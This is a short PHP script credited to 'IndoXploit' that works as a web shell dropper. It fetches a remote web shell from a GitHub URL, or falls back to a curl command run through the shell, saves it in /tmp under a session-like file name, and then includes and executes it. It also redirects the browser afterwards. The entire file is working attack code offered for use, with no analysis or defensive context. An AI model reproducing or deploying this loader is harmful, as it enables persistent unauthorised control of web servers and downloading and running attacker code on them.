<?php
# IndoXploit
# Bypass 406 Not Acceptable & Auto Delete Shell
# Coded by: L0c4lh34rtz - IndoXploit
$URL = 'https://raw.githubusercontent.com/cyberserkers/webshell/master/Indone5Hell.php';
$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php';
function M() {
$FGT = @file_get_contents($GLOBALS['URL']);
if(!$FGT) {
echo `curl -k $(echo {$GLOBALS['URL']} | base64 -d) > {$GLOBALS['TMP']}`;
} else {
$HANDLE = fopen($GLOBALS['TMP'], 'w');
fwrite($HANDLE, $FGT);
fclose($HANDLE);
}
echo '<script>window.location="?indoxploit";</script>';
}
if(file_exists($TMP)) {
if(filesize($TMP) === 0) {
unlink($TMP);
M();
} else {
include($TMP);
}
} else {
M();
}
?>